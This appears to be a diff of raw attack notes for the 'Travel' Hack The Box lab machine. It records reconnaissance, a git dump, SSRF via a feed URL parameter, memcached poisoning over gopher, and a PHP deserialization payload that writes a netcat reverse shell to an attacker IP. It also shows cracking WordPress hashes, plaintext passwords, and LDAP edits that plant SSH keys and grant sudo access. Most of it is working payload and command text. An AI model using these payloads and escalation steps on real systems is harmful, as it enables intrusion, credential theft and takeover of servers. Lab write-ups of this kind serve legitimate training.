@@ -1,0 +1,214 @@
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 16:59 EDT
+Nmap scan report for travel.htb (10.10.10.189)
+Host is up (0.079s latency).
+rDNS record for 10.10.10.189: www.travel.htb
+Not shown: 65532 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+
+Nmap done: 1 IP address (1 host up) scanned in 34.30 seconds
+
+blog.travel.htb
+http://blog.travel.htb/xmlrpc.php
+
+POST /xmlrpc.php HTTP/1.1
+Host: blog.travel.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: wordpress_test_cookie=WP+Cookie+check
+Upgrade-Insecure-Requests: 1
+Content-Length: 95
+
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+
+http://blog.travel.htb/wp-includes/wlwmanifest.xml
+
+view-source:http://blog.travel.htb/oembed/1.0/
+view-source:http://blog.travel.htb/awesome-rss/
+  http://blog-dev.travel.htb
+  @import url(http://blog-dev.travel.htb/wp-content/uploads/2020/04/custom-css-version#01.css); 
+
+http://blog.travel.htb/robots.txt
+  User-agent: *
+  Disallow: /wp-admin/
+  Allow: /wp-admin/admin-ajax.php
+
+http://blog-dev.travel.htb
+raft large words reaveals
+.
+.git
+    index            
+    config           
+    logs             
+        refs
+        HEAD
+    objects          
+    info             
+    .                
+    hooks            
+    description      
+    branches         
+    refs             
+    HEAD
+... to much work to fuzz everything... use gitdumper
+
+
+the rss_template.php shows us a path where we can feed in our own xml
+http://blog.travel.htb/awesome-rss/?custom_feed_url=http://10.10.14.12/sploit.xml
+
+<!--
+DEBUG
+ ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+| xct_4e5612ba07(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) |
+ ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+-->
+a:4:{s:5:"child";s:0:"@eval($_REQUEST['eval']);";}
+
+http://www.travel.htb/newsfeed/customfeed.xml
+http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php
+
+file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
+* create logs directory in `wp-content/themes/twentytwenty` 
+
+/etc/memcached.conf
+logfile /var/log/memcached.log
+
+blog.travel.htb/awesome-rss/?custom_feed_url=gopher://0x7f.0x0.0x0.0x1:11211/PAYLOAD
+<?php
+$name = 'http://www.travel.htb/newsfeed/customfeed.xml';
+$hs = md5($name);
+$type = 'spc';
+echo md5("$hs:$type");
+?>
+4e5612ba079c530a6b1f148c0b352241
+xct_4e5612ba079c530a6b1f148c0b352241
+
+blog.travel.htb/awesome-rss/?custom_feed_url=gopher://0x7f.0x0.0x0.0x1:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%2019%0d%0aO:5:%22Hello%22:0:%7B%7D%20%20%20%0d%0a
+
+git-dump/tmp/sploit.pyp will write out the serialized object:
+O:14:"TemplateHelper":2:{s:4:"file";s:7:"kun.php";s:4:"data";s:50:"<?php exec("nc -e /bin/bash 10.10.14.21 6969"); ?>";}  
+
+use gopherus to deliver this
+blog.travel.htb/awesome-rss/?custom_feed_url=gopher://0x7f.0x0.0x0.0x1:11211/_%0d%0aset%20<NAME>...
+
+
+gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20120%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:7:%22kun.php%22%3Bs:4:%22data%22%3Bs:50:%22%3C%3Fphp%20exec%28%22nc%20-e%20/bin/bash%2010.10.14.21%206969%22%29%3B%20%3F%3E%22%3B%7D%0d%0a
+
+blog.travel.htb/awesome-rss/?custom_feed_url=gopher://0x7f.0x0.0x0.0x1:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20120%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:7:%22kun.php%22%3Bs:4:%22data%22%3Bs:50:%22%3C%3Fphp%20exec%28%22nc%20-e%20/bin/bash%2010.10.14.21%206969%22%29%3B%20%3F%3E%22%3B%7D%0d%0a
+
+/opt folder has backup mysql log with two hashes
+LOCK TABLES `wp_users` WRITE; 
+/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */;
+INSERT INTO `wp_users` VALUES (1,'admin','$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/','admin','admin@travel.htb','http://loca
+lhost','2020-04-13 13:19:01','',0,'admin'),(2,'lynik-admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.','lynik-admin','lynik
+@travel.htb','','2020-04-13 13:36:18','',0,'Lynik Schmidt');
+/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */;
+UNLOCK TABLES;
+/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
+
+/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
+/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
+/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
+/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
+/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
+/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
+/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
+
+-- Dump completed on 2020-04-13 13:39:31
+
+(1,'admin','$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/','admin','admin@travel.htb'
+(2,'lynik-admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.','lynik-admin','lynik@travel.htb'
+
+hashcat -O -m 400 -a 0 -o cracked.txt hashes.txt ~/wordlists/rockyou.txt --force
+
+lyrik-admin@travel.htb:1stepcloser
+
+nc -v ldap.travel.htb 636
+
+ldapadd -x -D 'cn=root,dc=example,dc=com' -W
+ldapsearch -x -D 'cn=root,dc=example,dc=com' -W
+
+.viminfo contains the password
+Theroadlesstraveled
+ldapmodify -x -D 'cn=lynik-admin,dc=travel,dc=htb' -w Theroadlesstraveled
+
+--------------------------------------------------------------------------------
+COMMAND:
+ldapadd -x -D 'cn=lynik-admin,dc=travel,dc=htb' -w Theroadlesstraveled -f trash.ldif
+--------------------------------------------------------------------------------
+an ldif file with:
+dn: uid=christopher,ou=users,ou=linux,ou=servers,dc=travel,dc=htb      
+changetype: Modify                                                     
+add: userPassword                                                      
+userPassword: {crypt}x                                                 
+--------------------------------------------------------------------------------
+COMMAND:
+ldapmodify -x -D 'cn=lynik-admin,dc=travel,dc=htb' -w Theroadlesstraveled -f trash.ldif
+NOT ALLOWED :(
+--------------------------------------------------------------------------------
+dn: uid=kun,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: kun
+uidNumber: 5003
+homeDirectory: /home/kun
+givenName: Christopher
+gidNumber: 5000
+sn: kun
+cn: kun kun
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+loginShell: /bin/bash
+userPassword: {crypt}x
+--------------------------------------------------------------------------------
+dn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+changetype: Modify
+replace: homeDirectory
+homeDirectory: /home/lynik-admin
+--------------------------------------------------------------------------------
+NOT ALLOWED :(
+--------------------------------------------------------------------------------
+dn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+changetype: Modify
+add: sshPublicKey
+sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjRGyVHHg427hTiSZiPogyYU1cAsBpnzuHMhbcwOoS74hBdV1dDLLE+sFa4Aednw7uoSyrgcKNijR7VzpKeSRAs86B0XI
+yrgGDTQ/QQFhN0ZCCEg0fmMgHqoj/j86ACINPWcQHwMHcWhZCm92yttD7q4/vq5Yjz05gFgKtipdYRFNgPYTVrgLTeday7JS+G/v458AMH0XWAz4aVVFFpJFy0oWv17d+f/U7SArQ96OXQxSq
+/7DSFF45bggtYEaMFd4/5wP5C/mag+1lSVMENv+oKkJar5IGZakxOaa/B58NR1VLF2qmDuLv2MdxWhZcn+zfJaYa7C/QkO3QizzDLkwTDip6Rq+Yq8AtO2Ftx7M/5IC5jviNC0NLXQo+xbfJl
+UJ2D0Pg98Csvw081V0JPJV+UQlQLK4YTIYIPh2u6B/jp9sThYLwDUNlZdn7b+4+XEIymmJzgb1ddsBiQw7fzrm1qP3p6/Sl9C9ueWDgXdiFOe+6+SEO/BBBF4Zy3KiVYF8= lynik-admin@t
+ravel
+
+Payload0:
+dn: uid=brian,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+changetype: modify 
+add: objectClass
+objectClass: ldapPublicKey
+
+Payload1:
+dn: uid=brian,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+changetype: Modify
+add: sshPublicKey
+sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEXEGStOs5wnUSQkP1inE03zKxM4S93vhcbvVjPmyV06KhObP0+C
+8oT8eOWvHj2Zgi8ME2/GdI90m8vZ7zl7IFy8OghlSq6CKwLRq6ik+ss7gkK0gmxAZx5TDRxfAbi/v4OPY3L3Z5Ci60CPAJ2N+PHvDzG1
+s5UIdrMZ1IVg/5FcLlOkBuGaL6V2bhUxVJwthb+FDOpVmCYN/HDpaTFuBHnhzW6YUmuC5XekGTespXpR5k1LHEQmSuXyawZuWe+gF78l
+0TnJeuayoMd7gf48xB3uTDFYreoKfGN9mcnwIuhmP7+ZShYQkYy724R1o1JSXWEBS09yJXNDHh4ty7kurwIAzfBhksUz0QYTUx2skDvN
+Yyk82SoTSNlyUKqcWfABS8vF4Q/PXiSujHQMzhGXe54wIW61vdbb4fWS6E1ONNMrl4jf5QP3Vi+q8pGesvXcP+2k0BvxQL02P8SsEFeO
+CuGE9qnlx81CGSTNZe1kjoBxQQO3cbeNI70nGqKYL03Q0= lynik-admin@travel
+
+Payload2:
+
+ldappasswd -s a  -x -D 'cn=lynik-admin,dc=travel,dc=htb' -w Theroadlesstraveled -x "uid=christopher,ou=users,ou=linux,ou=servers,dc=travel,dc=htb"
+ldapsearch -x -D 'cn=lynik-admin,dc=travel,dc=htb' -w Theroadlesstraveled
+
+trvl-admn is in group 27 (sudo), use guid 27 to make the imposter sudo
+
+getent
